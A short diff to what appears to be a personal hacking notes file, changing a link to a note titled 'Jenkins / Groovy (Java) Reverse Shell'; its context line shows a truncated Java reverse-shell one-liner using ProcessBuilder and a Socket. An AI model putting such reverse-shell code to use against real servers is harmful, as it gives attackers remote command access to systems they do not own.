@@ -7,9 +7,8 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 # References
-- [20221003151247](/zet/20221003151247/) Jenkins / Groovy (Java) Reverse Shell
+- [20221003151247](/zet/20221003151247/README.md) Jenkins / Groovy (Java) Reverse Shell
 - ~/kb/hacking/tricks/jenkins-rev-shell-code.md
 
 Tags:
     #assorted
-
